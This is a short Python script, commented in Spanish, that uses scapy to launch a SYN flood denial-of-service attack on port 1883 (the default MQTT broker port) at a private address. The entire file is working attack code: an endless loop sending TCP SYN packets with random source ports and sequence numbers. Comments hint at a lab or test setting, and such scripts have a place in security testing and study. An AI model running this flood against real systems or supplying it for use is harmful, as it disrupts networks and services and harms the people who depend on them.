from scapy.all import IP, TCP, send
import random
import time

# Configuración del ataque
target_ip = "10.0.2.15"   # IP del broker o víctima
target_port = 1883        # Puerto destino (ej: MQTT por defecto)

# Función principal del ataque SYN Flood
def syn_flood():
    print(f"[+] Starting SYN Flood to {target_ip}:{target_port}")

    while True:
        # Crear paquete IP (tu IP real como source)
        ip_packet = IP(dst=target_ip)

        # Crear paquete TCP SYN con un puerto origen aleatorio
        tcp_packet = TCP(
            sport=random.randint(1024, 65535),  # Puerto origen aleatorio
            dport=target_port,
            flags="S",                          # Solo SYN
            seq=random.randint(0, 4294967295)   # Número de secuencia aleatorio
        )

        # Enviar paquete
        send(ip_packet / tcp_packet, verbose=0)

        print(f"[+] Sent SYN packet to {target_ip}:{target_port}")
        time.sleep(0.001)  # Controla la velocidad del ataque (baja para test)

# Ejecutar el ataque
if __name__ == "__main__":
    syn_flood()
